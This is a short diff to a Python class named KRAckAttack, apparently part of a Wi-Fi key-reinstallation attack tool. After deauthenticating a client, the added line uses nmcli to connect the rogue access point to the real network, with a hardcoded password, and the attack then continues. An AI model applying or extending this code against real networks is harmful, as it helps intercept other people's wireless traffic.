@@ -930,6 +930,9 @@ class KRAckAttack():
 		if self.clientmac:
 			self.queue_disas(self.clientmac)
 
+		# 將流氓 AP 與原 AP 連線
+		subprocess.check_output(["nmcli", "dev", "wifi", "con", self.netconfig.ssid, "password", "password"])
+
 		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
 		self.last_rogue_beacon = time.time()
